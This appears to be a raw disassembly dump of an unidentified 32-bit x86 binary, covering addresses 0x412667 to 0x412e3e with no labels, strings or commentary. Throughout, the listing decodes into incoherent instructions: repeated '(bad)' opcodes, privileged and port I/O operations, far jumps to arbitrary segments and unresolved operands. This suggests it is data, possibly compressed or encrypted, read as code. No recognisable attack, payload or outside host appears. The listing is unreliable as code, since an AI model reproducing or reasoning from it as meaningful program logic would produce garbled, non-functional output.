  412667:	adc    ebp,DWORD PTR [ecx]
  412669:	fidivr WORD PTR [esi-0x78]
  41266c:	jecxz  0x412657
  41266e:	repnz mov dh,0xde
  412671:	mov    ds:0x49d61d6a,al
  412676:	dec    edi
  412677:	(bad)  
  412678:	sbb    eax,DWORD PTR [ecx+0x45190347]
  41267e:	fiadd  DWORD PTR [edi+0x12]
  412681:	inc    esp
  412682:	and    cl,dl
  412684:	pop    esp
  412685:	mov    WORD PTR [eax-0x3cfe96da],fs
  41268b:	int    0x1a
  41268d:	push   cs
  41268e:	mov    eax,ebp
  412690:	hlt    
  412691:	cmp    edx,edx
  412693:	arpl   WORD PTR [ecx-0x7ab547b9],si
  412699:	xchg   ebx,eax
  41269a:	(bad)  
  41269b:	outs   dx,BYTE PTR ds:[esi]
  41269c:	nop
  41269d:	adc    eax,0xbb0ed425
  4126a2:	lahf   
  4126a3:	scas   eax,DWORD PTR es:[edi]
  4126a4:	std    
  4126a5:	pop    es
  4126a6:	sub    al,BYTE PTR [esi+0x6a921976]
  4126ac:	mov    ah,0xd5
  4126ae:	or     DWORD PTR [ebx-0x2f72bf43],esp
  4126b4:	shr    BYTE PTR [edi+0x71],0xd1
  4126b8:	fwait
  4126b9:	dec    eax
  4126ba:	sti    
  4126bb:	and    edx,DWORD PTR [edi]
  4126bd:	(bad)  
  4126be:	adc    al,0x8e
  4126c0:	xor    ebp,esi
  4126c2:	xchg   esi,eax
  4126c3:	xabort 0x2f
  4126c6:	cli    
  4126c7:	lds    esp,FWORD PTR [ecx]
  4126c9:	not    BYTE PTR [ebp+0x75]
  4126cc:	sub    dl,BYTE PTR [ebp+0x5ac2ef97]
  4126d2:	(bad)  
  4126d3:	adc    BYTE PTR [ecx+0x2c],ch
  4126d6:	jb     0x4126c7
  4126d8:	mov    edi,0x8ef1093e
  4126dd:	test   DWORD PTR [ebx],esi
  4126df:	sahf   
  4126e0:	inc    ebp
  4126e1:	xchg   edx,eax
  4126e2:	out    dx,eax
  4126e3:	mov    edx,0xcb265310
  4126e8:	mov    ds:0x308d341d,eax
  4126ed:	xor    DWORD PTR [ecx],ebx
  4126ef:	cmp    DWORD PTR [edi+0x1233f4e2],ecx
  4126f5:	lods   al,BYTE PTR ds:[si]
  4126f7:	dec    ebp
  4126f8:	push   ebx
  4126f9:	icebp  
  4126fa:	sub    DWORD PTR [esp+ebp*8],0xffffff97
  4126fe:	mov    bl,0x9e
  412700:	or     BYTE PTR [ebx+0x77ddf29a],ch
  412706:	lock jno 0x412758
  412709:	loope  0x4126fb
  41270b:	and    al,0xbe
  41270d:	enter  0xcd34,0x12
  412711:	(bad)  
  412712:	out    dx,eax
  412713:	sbb    ebx,DWORD PTR [ecx]
  412715:	jb     0x4126a7
  412717:	jg     0x4126a4
  412719:	aas    
  41271a:	add    DWORD PTR [ecx-0x2aadcb88],ecx
  412720:	jo     0x4126c2
  412722:	mov    edx,0x8e7a4178
  412727:	gs inc ebx
  412729:	and    dl,0x37
  41272c:	cld    
  41272d:	test   al,0x9
  41272f:	fild   WORD PTR [ebx+eiz*2]
  412732:	jmp    0xc2f5:0x6860befd
  412739:	aas    
  41273a:	push   0x3bf71fcd
  41273f:	cmp    dl,dh
  412741:	mov    ch,BYTE PTR [ecx+0x11]
  412744:	jmp    0x4127a9
  412746:	out    0x4c,al
  412748:	mov    esi,edx
  41274a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41274b:	adc    eax,0xddbe5ef3
  412750:	mov    fs,WORD PTR [edx]
  412752:	mov    al,0xbd
  412754:	repz mov ds:0x8fa0eeef,al
  41275a:	loop   0x412749
  41275c:	mov    ch,bh
  41275e:	fsubr  st(1),st
  412760:	popf   
  412761:	xchg   BYTE PTR [ebx+0x40],dl
  412764:	in     al,0xb2
  412766:	repz xor DWORD PTR [ebx],0x9b3c3ecd
  41276d:	lds    ebx,FWORD PTR [esi+0x6b6666dc]
  412773:	push   eax
  412774:	sbb    DWORD PTR [ebx+ecx*8+0x46e4afa2],eax
  41277b:	test   DWORD PTR [ebx-0x267ddc38],esi
  412781:	test   BYTE PTR [ebp-0x3736dfa0],dl
  412787:	pushf  
  412788:	(bad)  
  412789:	js     0x4127f4
  41278b:	mov    ecx,0xe28e4066
  412790:	and    al,0xef
  412792:	aam    0x95
  412794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412795:	icebp  
  412796:	jno    0x4127fa
  412798:	lock stc 
  41279a:	or     eax,0x6306ee4c
  41279f:	dec    edi
  4127a0:	cmp    cl,BYTE PTR [ebp+0x1]
  4127a3:	not    DWORD PTR [eax+0x27]
  4127a6:	mov    eax,0x8751891c
  4127ab:	mov    eax,ds:0x14ab305e
  4127b0:	into   
  4127b1:	jne    0x4127cd
  4127b3:	mov    ch,0x47
  4127b5:	pushf  
  4127b6:	iret   
  4127b7:	test   al,0x84
  4127b9:	jnp    0x412769
  4127bb:	enter  0x37cb,0x31
  4127bf:	sbb    ebx,0xffffffc5
  4127c2:	push   eax
  4127c3:	shr    DWORD PTR [edx-0xe],0xac
  4127c7:	xchg   ebp,eax
  4127c8:	and    al,0x5b
  4127ca:	mov    ecx,0x7f7793d5
  4127cf:	xor    BYTE PTR [esi],bh
  4127d1:	xchg   ecx,eax
  4127d2:	cld    
  4127d3:	shl    DWORD PTR [ecx],0x7e
  4127d6:	xchg   esp,eax
  4127d7:	daa    
  4127d8:	adc    dh,0xa2
  4127db:	outs   dx,BYTE PTR ss:[esi]
  4127dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127de:	jle    0x41277b
  4127e0:	out    dx,al
  4127e1:	push   ds
  4127e2:	(bad)  [ecx+0xa34ebbe]
  4127e8:	fbld   TBYTE PTR [eax]
  4127ea:	add    al,0x6f
  4127ec:	cdq    
  4127ed:	and    BYTE PTR [eax+0x660d9ad4],dl
  4127f3:	jmp    0xfa5b:0x4f77853c
  4127fa:	sub    eax,0xcf394284
  4127ff:	int    0x8e
  412801:	pop    eax
  412802:	sbb    al,0x8a
  412804:	pop    ebx
  412805:	pop    ss
  412806:	sbb    al,0x3d
  412808:	out    dx,eax
  412809:	addr16 fwait
  41280b:	in     al,0x72
  41280d:	sub    eax,0x70de447b
  412812:	xchg   esi,eax
  412813:	jo     0x41280a
  412815:	jo     0x4127a0
  412817:	jmp    0x4127a1
  412819:	or     bh,BYTE PTR [ecx+0xe7f44f2]
  41281f:	repz imul edx,DWORD PTR [edi+0x44],0xffffffb5
  412824:	in     al,0x84
  412826:	mov    BYTE PTR [edi],dl
  412828:	aas    
  412829:	imul   edx,ecx,0x81c45f90
  41282f:	into   
  412830:	scas   al,BYTE PTR es:[edi]
  412831:	mov    esi,cs
  412833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412834:	or     eax,0xd6060f28
  412839:	cmp    eax,0x2f6e8d6a
  41283e:	jmp    0x853d7831
  412843:	hlt    
  412844:	and    DWORD PTR [edx-0x3d],ebx
  412847:	outs   dx,BYTE PTR ds:[esi]
  412848:	inc    ebx
  412849:	jo     0x41287b
  41284b:	outs   dx,DWORD PTR ds:[esi]
  41284c:	fistp  QWORD PTR ss:[ecx]
  41284f:	nop
  412850:	cmp    al,0x20
  412852:	int3   
  412853:	inc    ecx
  412854:	sysret 
  412856:	adc    ebp,DWORD PTR ds:0xced461b7
  41285c:	sar    ch,1
  41285e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41285f:	loopne 0x412822
  412861:	imul   ecx,ecx,0x385b3039
  412867:	rcr    BYTE PTR [ebx-0x49],0xe7
  41286b:	sub    ecx,ebx
  41286d:	neg    BYTE PTR [edx+0x11]
  412870:	test   DWORD PTR [esi+0x63ed9b48],0x20388982
  41287a:	ds dec esi
  41287c:	pop    eax
  41287d:	mov    BYTE PTR [esi-0xb],dl
  412880:	push   es
  412881:	mov    ds:0xdcba71bf,al
  412886:	sub    eax,DWORD PTR [edx]
  412888:	and    DWORD PTR [edx-0x4f938cf1],0xa1cd780e
  412892:	sub    dh,BYTE PTR [esi-0x7d31e3d9]
  412898:	dec    edi
  412899:	(bad)  
  41289a:	pop    edx
  41289b:	adc    DWORD PTR [edx+0x1b],ecx
  41289e:	icebp  
  41289f:	sar    DWORD PTR [ecx+0x4d],1
  4128a2:	mov    dl,0xd2
  4128a4:	jb     0x412882
  4128a6:	outs   dx,BYTE PTR ds:[esi]
  4128a7:	push   esi
  4128a8:	and    eax,0xb18ce53b
  4128ad:	push   ebx
  4128ae:	ins    BYTE PTR es:[edi],dx
  4128af:	aaa    
  4128b0:	jne    0x412846
  4128b2:	scas   al,BYTE PTR es:[edi]
  4128b3:	push   ebx
  4128b4:	ror    BYTE PTR [esp+ebp*4-0x58],0x2c
  4128b9:	mov    ch,0x3c
  4128bb:	fdivr  QWORD PTR [ebx-0x71]
  4128be:	or     al,0x42
  4128c0:	(bad)  
  4128c1:	mov    ?,eax
  4128c3:	add    al,0x3b
  4128c5:	mov    eax,0xb12b8143
  4128ca:	out    0xd3,eax
  4128cc:	and    dh,al
  4128ce:	stc    
  4128cf:	test   al,0x8f
  4128d1:	lds    esp,FWORD PTR [eax]
  4128d3:	add    edx,0x2e
  4128d6:	sbb    ah,bl
  4128d8:	popa   
  4128d9:	or     DWORD PTR [ebx+eiz*8],esp
  4128dc:	ds (bad) 
  4128de:	fld    DWORD PTR [eax]
  4128e0:	pushf  
  4128e1:	and    al,0x8b
  4128e3:	mov    edi,0x7736d0b8
  4128e8:	pop    es
  4128e9:	push   ebp
  4128ea:	pushf  
  4128eb:	fidiv  WORD PTR [edi-0x365caf13]
  4128f1:	aad    0xd4
  4128f3:	in     al,dx
  4128f4:	pop    esp
  4128f5:	add    eax,edi
  4128f7:	adc    DWORD PTR [ecx+0x5ae69ea3],edx
  4128fd:	xchg   BYTE PTR [ecx],ch
  4128ff:	sbb    dl,0x8e
  412902:	in     al,0x48
  412904:	adc    al,0x34
  412906:	dec    edi
  412907:	xchg   esi,eax
  412908:	add    esp,DWORD PTR es:0x76d89d09
  41290f:	loopne 0x4128de
  412911:	xor    DWORD PTR [edi-0x53],edi
  412914:	and    esi,eax
  412916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412917:	into   
  412918:	mov    edx,0xafac522c
  41291d:	pop    ecx
  41291e:	add    ebx,ebx
  412920:	dec    ecx
  412921:	pushf  
  412922:	inc    ebx
  412923:	xchg   BYTE PTR [ebx-0x48],bl
  412926:	cld    
  412927:	stos   BYTE PTR es:[edi],al
  412928:	adc    BYTE PTR [edx],bl
  41292a:	sbb    al,0x59
  41292c:	pop    eax
  41292d:	les    edi,FWORD PTR [ecx]
  41292f:	fwait
  412930:	xor    bh,ah
  412932:	inc    edi
  412933:	cs js  0x4128e0
  412936:	std    
  412937:	inc    ebx
  412938:	xchg   edx,eax
  412939:	jo     0x4128dd
  41293b:	adc    ebp,DWORD PTR [eax+0x26606017]
  412941:	sbb    esi,DWORD PTR [ecx-0x25ced860]
  412947:	pop    es
  412948:	add    eax,0xa9b52c3d
  41294d:	push   cs
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	cmc    
  412950:	retf   
  412951:	sbb    al,0x66
  412953:	fsub   st,st(6)
  412955:	fisub  DWORD PTR [edi]
  412957:	push   edx
  412958:	cli    
  412959:	ret    0x4911
  41295c:	cdq    
  41295d:	test   DWORD PTR [edi+0xa],esp
  412960:	out    0x63,al
  412962:	(bad)  
  412963:	mov    ch,0x8
  412965:	enter  0x4359,0xed
  412969:	dec    edx
  41296a:	cmp    esi,edi
  41296c:	(bad)  
  41296e:	pop    ebx
  41296f:	fs retf 
  412971:	inc    esi
  412972:	push   0xc1611b1f
  412977:	jae    0x412986
  412979:	out    dx,al
  41297a:	pop    ds
  41297b:	jne    0x41298f
  41297d:	mov    esi,0x7df5c442
  412982:	call   0xa0b3b014
  412987:	xor    esp,ebp
  412989:	pop    eax
  41298a:	or     esp,ecx
  41298c:	pop    edx
  41298d:	push   esi
  41298e:	and    eax,0xd19f5f0a
  412993:	adc    esp,0xd5696141
  412999:	adc    DWORD PTR [edi-0x4f],edx
  41299c:	inc    esp
  41299d:	adc    DWORD PTR [edx+0xb],esp
  4129a0:	or     edx,ecx
  4129a2:	sub    DWORD PTR [edx-0x5f],ebp
  4129a5:	mov    eax,ds:0xe277b669
  4129aa:	js     0x4129c4
  4129ac:	jne    0x412941
  4129ae:	inc    edi
  4129af:	dec    BYTE PTR [ecx+0x14]
  4129b2:	cmp    ebp,DWORD PTR [edx]
  4129b4:	mov    bh,0x1b
  4129b6:	nop
  4129b7:	test   al,0xf4
  4129b9:	mov    ebx,0x64a43111
  4129be:	add    eax,0x4db89df7
  4129c3:	xchg   ecx,eax
  4129c4:	gs jno 0x4129d9
  4129c7:	cdq    
  4129c8:	es push es
  4129ca:	xchg   BYTE PTR [edi+0x73d3add1],ch
  4129d0:	pop    es
  4129d1:	pop    edi
  4129d2:	(bad)  
  4129d3:	div    DWORD PTR [esi+0x78]
  4129d6:	jae    0x412978
  4129d8:	mov    ecx,gs
  4129da:	jnp    0x4129ba
  4129dc:	ja     0x4129d0
  4129de:	jbe    0x4129e7
  4129e0:	push   esp
  4129e1:	xchg   ecx,eax
  4129e2:	pop    es
  4129e3:	mov    al,ds:0x5ce649cb
  4129e8:	pop    es
  4129e9:	xor    al,0x2d
  4129eb:	fwait
  4129ec:	sbb    edx,esi
  4129ee:	mov    ecx,0x4a92bcaa
  4129f3:	push   ds
  4129f4:	pop    ss
  4129f5:	jo     0x412a56
  4129f7:	fwait
  4129f8:	and    eax,0xc0d7990a
  4129fd:	retf   
  4129fe:	pop    esi
  4129ff:	js     0x412a02
  412a01:	jg     0x412a17
  412a03:	repnz xchg edx,eax
  412a05:	mov    ds:0xb9e5e31c,eax
  412a0a:	and    al,0xbc
  412a0c:	xchg   edi,eax
  412a0d:	or     al,0x75
  412a0f:	test   al,0xfe
  412a11:	out    0xf1,al
  412a13:	cmc    
  412a14:	add    eax,0x308a0ed6
  412a19:	lock pop edx
  412a1b:	jb     0x412a76
  412a1d:	push   edx
  412a1e:	aad    0xc6
  412a20:	ja     0x412a55
  412a22:	shl    DWORD PTR [edi],0x54
  412a25:	gs scas eax,DWORD PTR es:[edi]
  412a27:	sub    al,0x25
  412a29:	adc    eax,DWORD PTR [ebp-0x16e7316]
  412a2f:	cmp    cl,BYTE PTR [eax+0x60627e4c]
  412a35:	loope  0x412a44
  412a37:	xor    BYTE PTR [ebx-0x67626cd],cl
  412a3d:	retf   0x9e5b
  412a40:	xor    al,BYTE PTR [ebp-0x119bbb43]
  412a46:	test   DWORD PTR [ecx],esp
  412a48:	mov    WORD PTR [esi+0x54755182],?
  412a4e:	mov    al,0x3
  412a50:	pop    ebp
  412a51:	(bad)  
  412a52:	out    dx,al
  412a53:	lea    ecx,[edx-0x33]
  412a56:	push   ebp
  412a57:	adc    cl,cl
  412a59:	in     eax,dx
  412a5a:	retf   0x7600
  412a5d:	xchg   edi,eax
  412a5e:	jmp    0x412ab5
  412a60:	mov    edi,0x56050032
  412a65:	iret   
  412a66:	pushf  
  412a67:	inc    ebx
  412a68:	ror    DWORD PTR [ebp+edi*4-0x5a],1
  412a6c:	cmp    cl,BYTE PTR [esi+ebx*1-0x1f68abf6]
  412a73:	shl    BYTE PTR [edi-0x37],0x6d
  412a77:	jmp    0x232e:0x5650c3f2
  412a7e:	push   ecx
  412a7f:	jne    0x412a4a
  412a81:	es sbb eax,0x8fc3cb59
  412a87:	jb     0x412a8f
  412a89:	cwde   
  412a8a:	nop
  412a8b:	mov    edi,0x1a36cd4a
  412a90:	and    DWORD PTR [edx-0x58e1d218],ebx
  412a96:	fnstcw WORD PTR [edi+0x65cbebc5]
  412a9c:	in     al,0x90
  412a9e:	or     BYTE PTR [edi+0x69a6e44d],0x27
  412aa5:	pop    es
  412aa6:	fwait
  412aa7:	jns    0x412abf
  412aa9:	iret   
  412aaa:	xor    dh,BYTE PTR [esi]
  412aac:	and    DWORD PTR [eax],edx
  412aae:	test   al,0x96
  412ab0:	fstp   DWORD PTR [edi-0x54e69563]
  412ab6:	jp     0x412b21
  412ab8:	jo     0x412b0f
  412aba:	xor    al,0xd9
  412abc:	lods   al,BYTE PTR ds:[esi]
  412abd:	in     al,dx
  412abe:	push   ss
  412abf:	mov    edi,0xe0fef97e
  412ac4:	mov    dh,0x29
  412ac6:	fs mov eax,0xeddc219
  412acc:	in     al,0x70
  412ace:	shl    DWORD PTR [ebp+0x1a],0x3
  412ad2:	in     eax,0xab
  412ad4:	stos   DWORD PTR es:[edi],eax
  412ad5:	retf   
  412ad6:	gs pop cx
  412ad9:	sti    
  412ada:	xor    DWORD PTR [edx],ecx
  412adc:	dec    esi
  412add:	mov    al,0x87
  412adf:	dec    ebp
  412ae0:	stos   BYTE PTR es:[edi],al
  412ae1:	mov    cl,0x38
  412ae3:	xchg   ebx,eax
  412ae4:	sub    bh,BYTE PTR ds:0xc03e17e6
  412aea:	shl    DWORD PTR [edi],cl
  412aec:	loope  0x412b18
  412aee:	inc    edx
  412aef:	ins    DWORD PTR es:[edi],dx
  412af0:	sbb    eax,0x37bbbaa
  412af5:	xor    ah,BYTE PTR [eax+ebx*8+0x6177a4a7]
  412afc:	mov    dl,0x47
  412afe:	(bad)  
  412aff:	fwait
  412b00:	pop    ecx
  412b01:	lods   eax,DWORD PTR ds:[esi]
  412b02:	test   eax,0x80c7eed2
  412b07:	sub    eax,0xca1e05cf
  412b0c:	fcmovu st,st(2)
  412b0e:	pop    esi
  412b0f:	aad    0x89
  412b11:	xchg   BYTE PTR [edx],ch
  412b13:	int3   
  412b14:	out    dx,eax
  412b15:	mov    dl,0xb0
  412b17:	jae    0x412ad6
  412b19:	test   DWORD PTR [edi+0x4e7ca13e],ebx
  412b1f:	rcl    DWORD PTR [edx+eiz*4-0x63ba88d0],0x3f
  412b27:	sbb    DWORD PTR [edi+0xceebb76],ebx
  412b2d:	fadd   QWORD PTR [edx-0x4575af92]
  412b33:	pop    edx
  412b34:	adc    ebx,edi
  412b36:	dec    ebp
  412b37:	jle    0x412ac4
  412b39:	cmp    ebx,esi
  412b3b:	(bad)  
  412b3c:	retf   
  412b3d:	(bad)  
  412b3e:	imul   ebp,DWORD PTR ds:0x271e35af,0xfffffff9
  412b45:	imul   edi,DWORD PTR ds:0xd8b5490f,0x59
  412b4c:	push   ebx
  412b4d:	arpl   WORD PTR [ebx+0x3e2e25b2],ax
  412b53:	push   ds
  412b54:	stos   DWORD PTR es:[edi],eax
  412b55:	mov    edi,0x129142a8
  412b5a:	sahf   
  412b5b:	push   ebp
  412b5c:	jle    0x412b2c
  412b5e:	aas    
  412b5f:	loop   0x412b9f
  412b61:	aam    0x37
  412b63:	add    esi,ebx
  412b65:	mov    ds:0x541960a9,eax
  412b6a:	vcvtsd2ss xmm6,xmm1,QWORD PTR [edi+0x20]
  412b6f:	shl    DWORD PTR [edi+0x3fe0fd35],0x5
  412b76:	and    DWORD PTR [ecx+0x39],esi
  412b79:	add    al,0x69
  412b7b:	hlt    
  412b7c:	ret    0x2bb2
  412b7f:	adc    al,0x27
  412b81:	repnz (bad) 
  412b83:	mov    ebp,DWORD PTR [edx]
  412b85:	nop
  412b86:	inc    edi
  412b87:	ss or  edi,ebp
  412b8a:	cmp    eax,0xaf0eebf5
  412b8f:	mov    ecx,0x53ae94f3
  412b94:	test   eax,0x1ee055f
  412b99:	jb     0x412b7d
  412b9b:	mov    edx,DWORD PTR [ebx-0x3e]
  412b9e:	pop    ecx
  412b9f:	lahf   
  412ba0:	lds    ebx,FWORD PTR [ebp+0x4d]
  412ba3:	stos   BYTE PTR es:[edi],al
  412ba4:	mov    edx,0x913ba75
  412ba9:	les    edx,FWORD PTR [bx]
  412bac:	in     al,dx
  412bad:	data16 sub bl,0x93
  412bb1:	and    BYTE PTR [eax-0x10e4e733],ch
  412bb7:	cld    
  412bb8:	and    edx,ecx
  412bba:	push   eax
  412bbb:	das    
  412bbc:	cwde   
  412bbd:	or     DWORD PTR [ebp+0x5ec7a067],ebx
  412bc3:	mov    ebx,0x64c966e
  412bc8:	sub    BYTE PTR [ecx-0x4f5f6fe5],bl
  412bce:	mov    ecx,DWORD PTR [edx-0x14]
  412bd1:	fld    TBYTE PTR [esi+0x4d]
  412bd4:	jb     0x412b8a
  412bd6:	addr16 aad 0x3
  412bd9:	lods   al,BYTE PTR ds:[esi]
  412bda:	push   ebx
  412bdb:	or     al,0xd2
  412bdd:	cli    
  412bde:	adc    DWORD PTR [ecx+0x72],esi
  412be1:	lods   eax,DWORD PTR ds:[esi]
  412be2:	xchg   ebp,eax
  412be3:	(bad)  
  412be5:	inc    ecx
  412be6:	outs   dx,DWORD PTR ds:[esi]
  412be7:	imul   esp,edx,0xffffffbe
  412bea:	adc    edi,DWORD PTR [edx]
  412bec:	call   DWORD PTR [esi]
  412bee:	sub    eax,0xb1b4c77b
  412bf3:	xchg   esi,eax
  412bf4:	adc    eax,0x74d901fa
  412bf9:	pop    ebx
  412bfa:	aad    0x17
  412bfc:	push   cs
  412bfd:	push   ebp
  412bfe:	inc    edx
  412bff:	add    eax,ecx
  412c01:	scas   eax,DWORD PTR es:[edi]
  412c02:	les    ecx,FWORD PTR [ecx-0x13]
  412c05:	loope  0x412bcf
  412c07:	not    ch
  412c09:	cs loope 0x412c3f
  412c0c:	ror    BYTE PTR [eax+0x77901992],1
  412c12:	xor    al,0x37
  412c14:	fsubr  QWORD PTR [eax-0xe20a381]
  412c1a:	cmp    BYTE PTR [eax+0x5c26c469],bh
  412c20:	ins    BYTE PTR es:[edi],dx
  412c21:	ror    ah,cl
  412c23:	into   
  412c24:	mov    ah,bh
  412c26:	mov    al,0xba
  412c28:	jns    0x412bdd
  412c2a:	mov    BYTE PTR [edi-0x5053e265],bh
  412c30:	sti    
  412c31:	pop    ebp
  412c32:	ins    BYTE PTR es:[edi],dx
  412c33:	xchg   esi,eax
  412c34:	out    dx,al
  412c35:	dec    edx
  412c36:	xor    esi,DWORD PTR [ebx+0x6e]
  412c39:	pop    ss
  412c3a:	mov    esp,0x103b12b6
  412c3f:	adc    esi,DWORD PTR [esi-0x56]
  412c42:	push   ds
  412c43:	jb     0x412c75
  412c45:	pop    ecx
  412c46:	xchg   ecx,eax
  412c47:	jne    0x412c2c
  412c49:	push   0xffffffbe
  412c4b:	add    eax,0xa25dda12
  412c50:	jecxz  0x412cad
  412c52:	cmp    edi,DWORD PTR [edx+esi*4+0x74]
  412c56:	jbe    0x412c56
  412c58:	jge    0x412c0c
  412c5a:	aas    
  412c5b:	or     BYTE PTR [eax-0xbfb8cb7],bh
  412c61:	icebp  
  412c62:	cmp    eax,DWORD PTR [edx+0x11f111d8]
  412c68:	mov    bl,0x84
  412c6a:	test   WORD PTR [edi-0x21722612],ax
  412c71:	in     al,dx
  412c72:	pushf  
  412c73:	jno    0x412bfd
  412c75:	dec    ebx
  412c76:	xchg   esp,eax
  412c77:	mov    ah,0x56
  412c79:	outs   dx,BYTE PTR ds:[esi]
  412c7a:	inc    edx
  412c7b:	loope  0x412cca
  412c7d:	add    edx,DWORD PTR [ecx-0x7f]
  412c80:	mov    BYTE PTR [edx],ch
  412c82:	int    0xf5
  412c84:	mov    DWORD PTR ds:0x67570d4e,esi
  412c8a:	addr16 loope 0x412d0b
  412c8d:	sbb    DWORD PTR [esi+0x71],ecx
  412c90:	dec    edi
  412c91:	aas    
  412c92:	outs   dx,DWORD PTR ds:[esi]
  412c93:	cmp    edx,DWORD PTR [edi-0x53]
  412c96:	popf   
  412c97:	jecxz  0x412c5e
  412c99:	add    esp,ecx
  412c9b:	jae    0x412c48
  412c9d:	sub    DWORD PTR cs:0xe3f466d9,ebp
  412ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca5:	or     BYTE PTR [esi+0x6eab4049],cl
  412cab:	push   edx
  412cac:	bound  ebp,QWORD PTR [esi-0x1d00335f]
  412cb2:	cmp    esi,0xfffffff1
  412cb5:	fwait
  412cb6:	mov    WORD PTR [ebx],cs
  412cb8:	popf   
  412cb9:	js     0x412cfd
  412cbb:	cmp    BYTE PTR [edi+ecx*4],0xf1
  412cbf:	fcom   st(1)
  412cc1:	loope  0x412ce0
  412cc3:	and    ch,al
  412cc5:	lea    esp,[eax+ebx*1-0x7931b08d]
  412ccc:	mov    bl,0x50
  412cce:	mov    esi,0x81378a9b
  412cd3:	in     eax,0x3e
  412cd5:	cdq    
  412cd6:	std    
  412cd7:	ss (bad) 
  412cd9:	repz sub al,0x59
  412cdc:	out    0xe1,al
  412cde:	mov    cl,BYTE PTR ds:0x2e93cc89
  412ce4:	jp     0x412d45
  412ce6:	fwait
  412ce7:	adc    eax,0xa8a56aa1
  412cec:	int3   
  412ced:	add    al,0x53
  412cef:	dec    eax
  412cf0:	iret   
  412cf1:	daa    
  412cf2:	mov    ecx,0xfcfd1291
  412cf7:	mov    DWORD PTR [edi],ebp
  412cf9:	aam    0xc0
  412cfb:	clc    
  412cfc:	call   0x74b8:0xeaa37dbf
  412d03:	lock scas al,BYTE PTR es:[edi]
  412d05:	stc    
  412d06:	jae    0x412cdd
  412d08:	cs inc esp
  412d0a:	pop    ds
  412d0b:	cdq    
  412d0c:	add    al,0xbc
  412d0e:	adc    ebp,DWORD PTR [edx+0x2a]
  412d11:	pop    eax
  412d12:	(bad)  
  412d13:	ins    BYTE PTR es:[edi],dx
  412d14:	mov    ds:0x3f3f7fd,eax
  412d19:	sub    al,0x5d
  412d1b:	lods   eax,DWORD PTR ds:[esi]
  412d1c:	push   ebx
  412d1d:	ud2    
  412d1f:	mov    ebx,edi
  412d21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d22:	sbb    BYTE PTR [edx+0x5753077],bh
  412d28:	into   
  412d29:	aas    
  412d2a:	xchg   si,ax
  412d2c:	(bad)  [eax]
  412d2e:	cld    
  412d2f:	(bad)  
  412d30:	in     eax,0x6f
  412d32:	dec    edx
  412d33:	xlat   BYTE PTR ds:[ebx]
  412d34:	jbe    0x412cd3
  412d36:	popf   
  412d37:	mov    dh,0x88
  412d39:	jae    0x412cec
  412d3b:	jp     0x412dbb
  412d3d:	or     al,0x3d
  412d3f:	and    eax,0xa347cedb
  412d44:	push   ss
  412d45:	addr16 out 0x9f,al
  412d48:	push   cs
  412d49:	fwait
  412d4a:	inc    esi
  412d4b:	repz xchg ebx,eax
  412d4d:	cmp    BYTE PTR [edi-0x6e],bh
  412d50:	mov    ebp,0xb5766fb1
  412d55:	das    
  412d56:	lahf   
  412d57:	(bad)  
  412d58:	fcomp  st(0)
  412d5a:	and    eax,0x99f907bd
  412d5f:	aaa    
  412d60:	sbb    BYTE PTR [ecx-0xb965855],al
  412d66:	dec    esp
  412d67:	mov    ebp,0xa8f5784d
  412d6c:	mov    bh,0x59
  412d6e:	push   ecx
  412d6f:	xchg   esi,eax
  412d70:	and    WORD PTR [edi+esi*8-0x72],bx
  412d75:	jge    0x412d82
  412d77:	fwait
  412d78:	sub    DWORD PTR [edi-0xbfb65a5],0xffffffd0
  412d7f:	jmp    0xaf8d0490
  412d84:	dec    ecx
  412d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d86:	push   cs
  412d87:	dec    edx
  412d88:	lock pop esp
  412d8a:	mov    esp,0xdcae697b
  412d8f:	xor    BYTE PTR [edx-0x75feb6a8],dh
  412d95:	ret    0x7cfb
  412d98:	cld    
  412d99:	jmp    0x772b:0xfa04a6e9
  412da0:	inc    esp
  412da1:	add    eax,0xf11e7bf
  412da6:	mov    ds:0xc6d88a3d,eax
  412dab:	mov    gs,WORD PTR [eax+0x7f]
  412dae:	mov    esi,DWORD PTR [eax]
  412db0:	and    BYTE PTR [edx+0x36e5ab17],0xa5
  412db7:	sbb    cl,bh
  412db9:	shr    edi,1
  412dbb:	scas   al,BYTE PTR es:[edi]
  412dbc:	or     al,0x71
  412dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dbf:	xchg   BYTE PTR [eax],ch
  412dc1:	(bad)  
  412dc2:	into   
  412dc3:	sub    eax,ebx
  412dc5:	icebp  
  412dc6:	fldenv [ebx-0x16]
  412dc9:	test   BYTE PTR cs:[ecx-0x6b255b52],ch
  412dd0:	retf   
  412dd1:	shl    DWORD PTR [esi-0x6c12a78e],cl
  412dd7:	jge    0x412d9b
  412dd9:	sub    eax,0x130c1e87
  412dde:	or     esp,DWORD PTR [ecx]
  412de0:	lods   eax,DWORD PTR ds:[esi]
  412de1:	xor    bh,dl
  412de3:	das    
  412de4:	adc    eax,0x1fa3d7ad
  412de9:	out    0xca,eax
  412deb:	cmp    DWORD PTR [eax+esi*8+0x5e25337b],eax
  412df2:	adc    BYTE PTR [esi-0x1b],cl
  412df5:	sbb    ch,ch
  412df7:	or     eax,0xdae39c89
  412dfc:	adc    DWORD PTR [esi-0x2f],0xffffffff
  412e00:	les    eax,FWORD PTR [ecx]
  412e02:	adc    dl,BYTE PTR [eax+0x191989fc]
  412e08:	in     al,0x13
  412e0a:	sti    
  412e0b:	jbe    0x412e7b
  412e0d:	mov    DWORD PTR [ecx-0x26],eax
  412e10:	push   esi
  412e11:	adc    al,BYTE PTR [edx+0x77806090]
  412e17:	ins    DWORD PTR es:[edi],dx
  412e18:	inc    esi
  412e19:	loop   0x412e79
  412e1b:	mov    ebp,0x13bc459b
  412e20:	jmp    0xdc898b89
  412e25:	xchg   esp,eax
  412e26:	and    cl,BYTE PTR [esi+0x436363a3]
  412e2c:	sbb    edx,DWORD PTR ds:[eax+0x1c]
  412e30:	call   0x9e14:0x7707ff39
  412e37:	call   0x5ff2:0xe1708862
  412e3e:	out    0x23,eax
